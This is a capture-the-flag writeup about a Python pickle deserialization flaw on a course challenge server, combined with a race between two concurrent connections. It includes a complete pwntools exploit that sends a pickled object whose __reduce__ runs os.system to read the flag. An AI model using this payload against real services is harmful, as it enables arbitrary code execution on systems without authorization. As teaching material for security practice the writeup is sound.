# Challenge `Pickles in a seri(al)ous race` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to remote code execution

- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt`, on port `23653`

- Impact: What results of exploiting this vulnerability
  - Allows the user to execute arbitrary code on the server through a vulnerability on `pickles`. When a `dumped` class containing a `__reduce__` method is `load`ed, the code in the method is executed on the host machine.

## Steps to reproduce

1. Start by `dump`ing a class containing the `__reduce__` method with the desired code to execute
2. Open a connection to the server, inputing an arbitrary username
3. Select `Classy` note and `Read`
4. Open a second connection, giving the same username
5. Select `Free` note and `Write`
6. Pick an arbitrary name and send the bytes of the `pickled` class
7. On the first connection, try to read the note with the chosen name
8. The `__reduce__` method will be executed, allowing the user to explore the host machine


The code used was the following:

```py
from pwn import *
import time
import pickle

####################

class RCE:
    def __reduce__(self):
        import os
        return os.system, ('cat home/ctf/flag',)
    
pickled = pickle.dumps(RCE())

####################

s1 = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23653", timeout=9999)

s1.send(b"joao\n")
s1.send(b"0\n") # classy
s1.send(b"0\n") # read

####################

s2 = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23653", timeout=9999)

s2.send(b"joao\n")
s2.send(b"1\n") # free
s2.send(b"1\n") # write
s2.send(b"hack\n") # nome
s2.send(pickled) # conteudo
s2.send(b"\n")
s2.send(b"\n")

####################

time.sleep(2)
s1.send(b"hack\n") # nome
s1.recvuntil(b"note_name: ")
print(s1.recvall().decode('utf-8'))
```

Note: The bytes must be sent as a `Free` note, since `Classy` dumps the note content as an attribute of another class.
      Two concurrent connections are needed because upon switching note type, all previous notes are deleted